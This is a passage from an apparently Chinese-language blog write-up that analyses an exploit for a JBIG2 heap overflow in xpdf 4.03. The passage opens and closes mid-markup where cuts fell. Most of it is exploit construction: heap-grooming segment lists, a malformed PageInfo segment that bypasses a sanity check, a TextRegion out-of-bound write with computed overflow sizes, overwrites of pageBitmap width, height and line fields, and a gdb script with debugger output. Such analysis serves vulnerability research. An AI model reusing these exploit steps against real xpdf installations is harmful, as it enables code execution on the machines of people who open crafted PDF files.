class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x20 [corrupted]</span><br><span class="line">FD: 0x55555579d9f0 —▸ 0x5555557d2860 —▸ 0x555555798db0 —▸ 0x5555557d7fe0 —▸ 0x5555557d7c30 ◂— ...</span><br><span class="line">BK: 0x5555557f96e0 —▸ 0x5555557f9300 —▸ 0x5555557fb200 —▸ 0x5555557fdf40 —▸ 0x5555557fd390 ◂— ...</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>那么接下来的问题是，如何设计堆风水？exploit 给了一个清晰明了的做法：</p><blockquote><p>利用 global segment GList 满则扩增的特性创建堆空洞，进而让其他结构体来占据这些内存空洞，完成堆风水。</p></blockquote><p>什么意思呢？我们看看 GList 的一些类方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GList::GList() &#123;</span><br><span class="line">  size &#x3D; 8;</span><br><span class="line">  data &#x3D; (void **)gmallocn(size, sizeof(void*));</span><br><span class="line">  length &#x3D; 0;</span><br><span class="line">  inc &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void GList::append(void *p) &#123;</span><br><span class="line">  if (length &gt;&#x3D; size) &#123;</span><br><span class="line">    expand();</span><br><span class="line">  &#125;</span><br><span class="line">  data[length++] &#x3D; p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void GList::expand() &#123;</span><br><span class="line">  size +&#x3D; (inc &gt; 0) ? inc : size;</span><br><span class="line">  data &#x3D; (void **)greallocn(data, size, sizeof(void*));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，初始时 <strong>GList size 为 8</strong>。当 GList 中元素个数超过容量时，GList 容量将会<strong>双倍扩增</strong>。也就是说，初始时的 size 为 8，下次扩增后的 size 是 16，再下次扩增后的 size 为 32，再下下次的 size 为 64（单位，个指针）。</p><p>扩增所使用的堆函数为 <code>realloc</code>，即当 GList 容量扩增后，原先那个堆块<strong>将被释放</strong>。同时又因为上面已经将其余全部小堆块全都分配出去了，因此 <strong>GList 容量扩增所分配的新堆块，一定来自于 top chunk</strong>，这就能保证每次 GList 容量扩张时，<strong>新堆块的分配顺序一定是从低地址向高地址分配</strong>。</p><p>因此尝试让 global segment GList 多次扩展，从 8 扩展至我们所需要的最终大小 64：</p><blockquote><p>代码中的 glist_capacity == 32。个人认为这个数表示的是第几次 append global GList 时会扩充 GList size 至 64。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">global_file &#x3D; [</span><br><span class="line">    SymbolDict(0, [Bitmap(1, 1)] * 0x10000),</span><br><span class="line">    SymbolDict(1, [Bitmap(1, 1)] * (size_to_overflow &#x2F;&#x2F; 8)),</span><br><span class="line">    SymbolDict(2, [Bitmap(1, 1)]),</span><br><span class="line">    # Heap grooming: eat every chunk in &#123;tcache,fast,small,large,unsorted&#125; bins</span><br><span class="line">    [[DummyAlloc(size)] * 128 for size in range(0x10, 0x1000, 0x10)],</span><br><span class="line">    [[DummyAlloc(size)] * 16 for size in range(0x1000, 0x10000, 0x100)],</span><br><span class="line">    # ------------ 开始尝试堆风水 ------------</span><br><span class="line">    [SymbolDict(i, []) for i in range(3, glist_capacity &#x2F;&#x2F; 2)],</span><br><span class="line">    # Now most bins are empty, except tcachebin 0x20, 0x50 and small bin 0x20</span><br><span class="line">    # This triggers GList::expand(), 0x80 -&gt; 0x100; allocates from top chunk</span><br><span class="line">    SymbolDict(glist_capacity &#x2F;&#x2F; 2, []),</span><br><span class="line">    [SymbolDict(i, []) for i in range(glist_capacity &#x2F;&#x2F; 2 + 1, glist_capacity)],</span><br><span class="line">    # 0x100 -&gt; 0x200, the old chunk should fall in tcache</span><br><span class="line">    SymbolDict(100, []),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>global segment 的堆风水执行结束后，其堆布局大致如下：</p><blockquote><p>注意 segNum 从 3 开始的 Symbol Dict，其结构体所分配的堆块（chunk size = 0x40）也是直接来自于 top chunk 。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; low address --------------------------------------------</span><br><span class="line">&#x2F;*</span><br><span class="line">    一些其他的堆块分配，包括</span><br><span class="line">    1. size&#x3D;8 的 global GList backing store</span><br><span class="line">    2. DummyAlloc</span><br><span class="line">    3. SymbolDict0、1、2</span><br><span class="line">    4. ...</span><br><span class="line">*&#x2F;</span><br><span class="line">SymbolDict3-8;</span><br><span class="line">size&#x3D;16 的 global GList backing store 堆空洞</span><br><span class="line">SymbolDict9-16;</span><br><span class="line">size&#x3D;32 的 global GList backing store 堆空洞</span><br><span class="line">SymbolDict17-32;</span><br><span class="line">size&#x3D;64 的 global GList backing store &#x2F;&#x2F; 最终的 GList data 堆位置，这里可不是堆空洞</span><br><span class="line">&#x2F;&#x2F; high address -------------------------------------------</span><br></pre></td></tr></table></figure><p>接下来，只需分别</p><ul><li>让 pageBitmap backing store 占据 size=16 的 Glist 堆空洞</li><li>让解析 TextRegion 时创建的 syms 指针数组占据 size=32 的 Glist 堆空洞</li></ul><p>即可完成堆布局。</p><blockquote><p>pageBitmap 的 JBIG2Bitmap 结构体堆位置在下文中将会说明。</p></blockquote><p>最后贴个 gdb script，可以使用该 gdbscript 辅助观察内存布局：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">file ..&#x2F;..&#x2F;xpdf-4.03&#x2F;build&#x2F;xpdf&#x2F;pdftohtml</span><br><span class="line">aslr off</span><br><span class="line">set follow-fork-mode parent</span><br><span class="line"></span><br><span class="line">b readSymbolDictSeg if segNum&#x3D;&#x3D;8</span><br><span class="line">commands</span><br><span class="line">    printf &quot;sakura in read symbol 8\n&quot;</span><br><span class="line"></span><br><span class="line">    printf &quot;globalSegments addr is:0x%llx\n&quot;, segments</span><br><span class="line">    printf &quot;segments GList backing buffer\n&quot;</span><br><span class="line">    p *(GList *)segments</span><br><span class="line">    # tcachebins</span><br><span class="line">    bins</span><br><span class="line">    # c</span><br><span class="line">end</span><br><span class="line">b readSymbolDictSeg if segNum&#x3D;&#x3D;16</span><br><span class="line">commands</span><br><span class="line">    printf &quot;sakura in read symbol 16\n&quot;</span><br><span class="line"></span><br><span class="line">    printf &quot;globalSegments addr is:0x%llx\n&quot;, segments</span><br><span class="line">    printf &quot;segments GList backing buffer\n&quot;</span><br><span class="line">    p *(GList *)segments</span><br><span class="line">    # tcachebins</span><br><span class="line">    bins</span><br><span class="line">    # c</span><br><span class="line">end</span><br><span class="line">b readSymbolDictSeg if segNum&#x3D;&#x3D;100</span><br><span class="line">commands</span><br><span class="line">    printf &quot;sakura in read symbol 32\n&quot;</span><br><span class="line"></span><br><span class="line">    printf &quot;globalSegments addr is:0x%llx\n&quot;, segments</span><br><span class="line">    printf &quot;segments GList backing buffer\n&quot;</span><br><span class="line">    p *(GList *)segments</span><br><span class="line">    # tcachebins</span><br><span class="line">    bins</span><br><span class="line"></span><br><span class="line">    tb JBIG2Stream.cc:1481</span><br><span class="line">    commands</span><br><span class="line">        printf &quot;after finish globalSegments addr is:0x%llx\n&quot;, segments</span><br><span class="line">        p *(GList *)segments</span><br><span class="line">        # tcachebins</span><br><span class="line">        bins</span><br><span class="line">    end</span><br><span class="line">    # replace finish and print info</span><br><span class="line">    # c</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">b JBIG2Stream.cc:2072 if segNum&#x3D;&#x3D;102</span><br><span class="line">commands</span><br><span class="line">    printf &quot;sakura in TextRegion to trigger oob\n&quot;</span><br><span class="line">    printf &quot;numSyms after underoverflow is:0x%llx\n&quot;, numSyms</span><br><span class="line">    set $oob_syms &#x3D; $rax</span><br><span class="line">    printf &quot;undersized syms buffer addr is:0x%llx\n&quot;, $oob_syms</span><br><span class="line"></span><br><span class="line">    printf &quot;globalSegments addr is:0x%llx\n&quot;, globalSegments</span><br><span class="line">    printf &quot;segments GList backing buffer\n&quot;</span><br><span class="line">    p *(GList *)globalSegments</span><br><span class="line"></span><br><span class="line">    printf &quot;pageBitmap addr is :0x%llx\n&quot;, pageBitmap</span><br><span class="line">    p *(JBIG2Bitmap *)pageBitmap</span><br><span class="line">    bins</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">r sploit.pdf output</span><br></pre></td></tr></table></figure><h3 id="b-占据堆空洞"><a href="#b-占据堆空洞" class="headerlink" title="b. 占据堆空洞"></a>b. 占据堆空洞</h3><p>global stream 中的解析操作是为了创建堆空洞，那 main stream 的解析操作就是为了占据堆空洞。</p><p>承接上文，接下来我们试着分配一个全新的 pageBitmap 结构，并让其 backing store 占据 size=16 的 Glist 空洞：</p><blockquote><p>代码中的 GLIST_DATA_SIZE = 0x200，表示 size=64 时 global glist data 占据的字节数。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">page0 &#x3D; [</span><br><span class="line">    # Make sure page bitmap buffer uses the second-last globalSegments data buffer so</span><br><span class="line">    # that it lies just before syms, at a fixed offset.</span><br><span class="line">    # GLIST_DATA_SIZE &#x2F;&#x2F; 4，表示占据 size&#x3D;16 时的 glist 堆空洞</span><br><span class="line">    PageInfo(101, w&#x3D;8 * (GLIST_DATA_SIZE &#x2F;&#x2F; 4), h&#x3D;1),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>此时堆布局如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; low address --------------------------------------------</span><br><span class="line">&#x2F;*</span><br><span class="line">    一些其他的堆块分配，包括</span><br><span class="line">    1. size&#x3D;8 的 global GList backing store</span><br><span class="line">    2. DummyAlloc</span><br><span class="line">    3. SymbolDict0、1、2</span><br><span class="line">    4. ...</span><br><span class="line">*&#x2F;</span><br><span class="line">SymbolDict3-8;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 注意这里！</span><br><span class="line">pageBitmap backing buffer &#x2F;&#x2F; size&#x3D;16 的 global GList backing store 堆空洞</span><br><span class="line"></span><br><span class="line">SymbolDict9-16;</span><br><span class="line"></span><br><span class="line">size&#x3D;32 的 global GList backing store 堆空洞</span><br><span class="line"></span><br><span class="line">SymbolDict17-32;</span><br><span class="line"></span><br><span class="line">size&#x3D;64 的 global GList backing store; &#x2F;&#x2F; 最终的 GList data 堆位置，这里可不是堆空洞</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 注意这里！</span><br><span class="line">pageBitmap JBIG2Bitmap; 结构体</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; high address -------------------------------------------</span><br></pre></td></tr></table></figure><p>这里简单说一下 pageBitmap <strong>结构本身的堆块分配(JBIG2Bitmap)</strong>，由于其 size 0x20 在堆链上找不到可分配的堆块，因此将<strong>仍然从 top chunk 中分配</strong>，故其地址位于 size=64 的 Glist 位置的<strong>高地址处</strong>，满足堆风水要求。</p><p>接下来需要在解析 TextRegion 时继续占用 size=32 的 Glist 堆空洞。因此 TextRegion 中创建的用户内存大小必须是 <code>syms_size = GLIST_DATA_SIZE // 2</code>，正好对应到 size=32 的 Glist 堆空洞大小。</p><p>但在做进一步的利用之前，我们需要绕过一个<a href="https://fossies.org/diffs/xpdf/4.02_vs_4.03/xpdf/JBIG2Stream.cc-diff.html" target="_blank" rel="noopener">比较有趣的 sanity check</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; sanity check: if the w&#x2F;h&#x2F;x&#x2F;y values are way out of range, it likely</span><br><span class="line">&#x2F;&#x2F; indicates a damaged JBIG2 stream</span><br><span class="line">if (w &#x2F; 10 &gt; pageW || h &#x2F; 10 &gt; pageH ||</span><br><span class="line">    x &#x2F; 10 &gt; pageW || y &#x2F; 10 &gt; pageH) &#123;</span><br><span class="line">    error(errSyntaxError, getPos(),</span><br><span class="line">          &quot;Bad size or position in JBIG2 text region segment&quot;);</span><br><span class="line">    done &#x3D; gTrue;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>xpdf-4.03/xpdf/JBIG2Stream.cc</code> 中多次出现上面的这种 sanity check，判断当前正在处理的 w是否越过了当前的 pageW 和 pageH（两个 JBIG2Stream 类的成员变量，用于表示当前 page 的宽度和高度），如果越界则说明当前解析过程可能存在问题，那么则立即停止解析当前 segment。</p><p>看上去好像这个 sanity check 没啥问题……</p><p>但实际上，我们回过头看看 <code>readPageInfoSeg</code> 函数的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">void JBIG2Stream::readPageInfoSeg(Guint length)</span><br><span class="line">&#123;</span><br><span class="line">    Guint xRes, yRes, flags, striping;</span><br><span class="line">    &#x2F;&#x2F; 从不受信任的流中直接读入 pageW 和 pageH</span><br><span class="line">    if (!readULong(&amp;pageW) || !readULong(&amp;pageH) ||</span><br><span class="line">        !readULong(&amp;xRes) || !readULong(&amp;yRes) ||</span><br><span class="line">        !readUByte(&amp;flags) || !readUWord(&amp;striping))</span><br><span class="line">    &#123;</span><br><span class="line">        goto eofError;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 如果 pageW 和 pageH 过大</span><br><span class="line">    if (pageW &#x3D;&#x3D; 0 || pageH &#x3D;&#x3D; 0 || pageW &gt; INT_MAX &#x2F; pageW)</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F; 则直接退出 pageInfoSeg 的解析</span><br><span class="line">        error(errSyntaxError, getPos(), &quot;Bad page size in JBIG2 stream&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以非常容易的发现， 即便 <code>readPageInfoSeg</code> 函数中检测到了 <code>pageW</code> 和 <code>pageH</code> 的异常，但也只是简单的退出掉当前 seg 的解析，<strong>保留了畸形 <code>pageW</code> 和 <code>pageH</code> 的值在 JBIG2Stream 类成员中</strong>。</p><p>这样，我们可以尝试插入一个超大 pageW 和 pageH 的 PageInfoSeg，从而污染这两个字段为超大值，bypass 后续所有新增加的 sanity check：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">page0 &#x3D; [</span><br><span class="line">    # Make sure page bitmap buffer uses the second-last globalSegments data buffer so</span><br><span class="line">    # that it lies just before syms, at a fixed offset.</span><br><span class="line">    PageInfo(101, w&#x3D;8 * (GLIST_DATA_SIZE &#x2F;&#x2F; 4), h&#x3D;1),</span><br><span class="line">    # Change pageH and pageW to a large value to bypass a (seriously funny) sanity</span><br><span class="line">    # check introduced in Xpdf 4.03; Xpdf would report an error without allocating</span><br><span class="line">    # a new pageBitmap, but won&#39;t stop parsing the JBIG2 stream, which is exactly what</span><br><span class="line">    # we want.</span><br><span class="line">    PageInfo(101, w&#x3D;1919114514, h&#x3D;1919114514),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>bypass 掉这个 sanity check 后，接下来就可以尝试创建 TextRegionSeg 来进行堆溢出了。承接上面所说的，这里所创建的 TextRegionSeg 需要满足几种要求：</p><ul><li>其内部创建的 syms 大小必须是 syms_size（这个值上面已经说明了）</li><li>向堆块写入的数据大小为 <code>size_to_overflow</code> 个字节，即实际写 <code>size_to_overflow // 8</code> 个指针</li></ul><p>因此接下来在 main stream 中，需要合理组合 TextRegion 所引用的 Symbol Dict 大小：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># Trigger the out-of-bound write.</span><br><span class="line">TextRegion(</span><br><span class="line">    102,</span><br><span class="line">    w&#x3D;1,</span><br><span class="line">    h&#x3D;1,</span><br><span class="line">    x&#x3D;0,</span><br><span class="line">    y&#x3D;0,</span><br><span class="line">    # size_to_overflow &#x2F;&#x2F; 8 个指针</span><br><span class="line">    ref_segs&#x3D;[1]</span><br><span class="line">    # 0x10000 + (syms_size - size_to_overflow) &#x2F;&#x2F; 8 个指针</span><br><span class="line">    + [2] * (0x10000 + (syms_size - size_to_overflow) &#x2F;&#x2F; 8)</span><br><span class="line">    # 共 0xffff0000 个指针</span><br><span class="line">    + [0] * 0xFFFF,</span><br><span class="line">),</span><br></pre></td></tr></table></figure><p>上面代码的组合中，</p><p><em>size</em><em><em>to</em></em><em>overflow</em>/8 + {0<em>x</em>10000 + (<em>syms</em><em><em>size</em> − <em>size</em></em><em>to</em><em><em>overflow</em>)/8} + 0<em>xffff<em>0000 = 0</em>x*100000000 + *syms</em></em><em>size</em>/8，即刚好分配 syms_size 个字节。</p><p>又因为先 ref 的那个 Symbol Dict 的大小为 <code>size_to_overflow // 8</code> 个指针。因此当 readTextRegion 解析第一个 ref 的 Symbol Dict 时，刚好向 syms 堆块中写入 <code>size_to_overflow</code> 个字节，直接溢出至 pageBitmap JBIG2Bitmap 结构体头部位置，如此便能达到溢出的目的。</p><p>这里说明一下 size_to_overflow 是怎么得出的，先上堆布局：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; low address --------------------------------------------</span><br><span class="line">&#x2F;*</span><br><span class="line">    一些其他的堆块分配，包括</span><br><span class="line">    1. size&#x3D;8 的 global GList backing store</span><br><span class="line">    2. DummyAlloc</span><br><span class="line">    3. SymbolDict0、1、2</span><br><span class="line">    4. ...</span><br><span class="line">*&#x2F;</span><br><span class="line">SymbolDict3-8;</span><br><span class="line">pageBitmap backing buffer &#x2F;&#x2F; size&#x3D;16 的 global GList backing store 堆空洞</span><br><span class="line">SymbolDict9-16;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 从此处开始写入数据</span><br><span class="line">syms &#x2F;&#x2F; syms 的 size 为 syms_size</span><br><span class="line">SymbolDict17-32; &#x2F;&#x2F; 16 个 SymbolDict 的 size，一个 SymbolDict 的 size 为 0x40 字节</span><br><span class="line">size&#x3D;64 的 global GList backing store; &#x2F;&#x2F; 此时的 Glist size 为 GLIST_DATA_SIZE</span><br><span class="line">pageBitmap JBIG2Bitmap 结构体  &#x2F;&#x2F; 这里还需要覆写 vtble + segNum + w + h + line，共24字节</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; high address -------------------------------------------</span><br></pre></td></tr></table></figure><p>根据堆布局可得知：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">size_to_overflow &#x3D; (</span><br><span class="line">    ptmalloc_chunk_size(syms_size)</span><br><span class="line">    # 40: sizeof(JBIG2SymbolDict); there are (glist_capacity &#x2F;&#x2F; 2) irrelevant JBIG2SymbolDict-s</span><br><span class="line">    + ptmalloc_chunk_size(40) * (glist_capacity &#x2F;&#x2F; 2)</span><br><span class="line">    + ptmalloc_chunk_size(GLIST_DATA_SIZE)</span><br><span class="line">    # Current page JBIG2Bitmap</span><br><span class="line">    # vtbl(8)</span><br><span class="line">    + 8</span><br><span class="line">    # segNum(4), w(4), h(4), line(4)</span><br><span class="line">    + 4 * 4</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>之后，将 readTextRegionSeg 中刚刚被释放掉的那个 syms_size 大小的堆块再次分配回来，防止在后续的利用中出现可能的崩溃。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Take back the free-d syms, hold it to prevent potential crash.</span><br><span class="line">GenericRegion(103, imm&#x3D;False, bitmap&#x3D;Bitmap(8, syms_size)),</span><br></pre></td></tr></table></figure><p>由于越界写入 pageBitmap JBIG2Bitmap 结构体头部位置的是<strong>指针值</strong>，可以越界读写的数据有限，因此我们需要根据这个有限的 pageBitmap 越界读写原语，来自己修改自己的 JBIG2Bitmap 结构体头，将其中的 w修改的更大，扩展自己的读写范围。根据上面的堆布局，同样可以得出 <code>page_bitmap_buf</code> 至 <code>pageBitmap JBIG2Bitmap</code> 的距离：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">page_bitmap_buf_to_class_offset &#x3D; (</span><br><span class="line">    ptmalloc_chunk_size(GLIST_DATA_SIZE &#x2F;&#x2F; 4)</span><br><span class="line">    + ptmalloc_chunk_size(40) * (glist_capacity &#x2F;&#x2F; 4)</span><br><span class="line">    + size_to_overflow</span><br><span class="line">    - 4 * 4</span><br><span class="line">    - 8</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>之后将其 w分别更改为 <em>w</em> = 227、<em>h</em> = 224、<em>line</em> = 224：</p><blockquote><p>imm 为 true 表示即时渲染，即立即修改 pageBitmap 上的指定位置。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Overwrite pageBitmap-&gt;w, h and line</span><br><span class="line">GenericRegion(</span><br><span class="line">    104,</span><br><span class="line">    x&#x3D;(page_bitmap_buf_to_class_offset + 12) * 8,</span><br><span class="line">    y&#x3D;0,</span><br><span class="line">    comb_op&#x3D;CombOp.Replace,</span><br><span class="line">    # (x, y) -&gt; mem[(y &lt;&lt; 24) | (x &gt;&gt; 3)] &gt;&gt; (7 - (x &amp; 7)), max 48-bit addressing</span><br><span class="line">    bitmap&#x3D;Bitmap(struct.pack(&quot;&lt;III&quot;, 2 ** 27, 2 ** 24, 2 ** 24)),</span><br><span class="line">    imm&#x3D;True,</span><br><span class="line">),</span><br></pre></td></tr></table></figure><p>修改后的 pageBitmap 的二维空间构造：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+------------------&gt; w&#x3D;2^27 bit</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">V h&#x3D;2^24 bit</span><br></pre></td></tr></table></figure><p>最后创建带有 16 个 Bitmap 的 SymbolDict ，以备接下来的利用所使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 16 &quot;variables&quot;. Since we can only do bitwise operations relative to page bitmap</span><br><span class="line"># with Refinement regions, we need these variables for peeking other absolute</span><br><span class="line"># addresses, and also rebase the page bitmap in one segment command.</span><br><span class="line">SymbolDict(105, [Bitmap(64, 1)] * 16)</span><br></pre></td></tr></table></figure><p>这些 SymbolDict 将用于<strong>地址解引用原语</strong>中，具体在下面会详细介绍。</p><blockquote><p>整体的堆风水布局大体如上所示。完成堆溢出后，pageBitmap 具备了大偏移读写的功能，因此接下来就要开始写原语利用了。</p></blockquote><h3 id="2-位运算原语"><a href="#2-位运算原语" class="headerlink" title="2. 位运算原语"></a>2. 位运算原语</h3><p>还记得先前介绍的 <code>GenericRefinementRegionSeg</code> 么（不记得就翻到上面看看），接下来我们需要利用这个 seg 的特性来编写任意位的位运算器。</p><p>exploit 中实现的位运算器如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 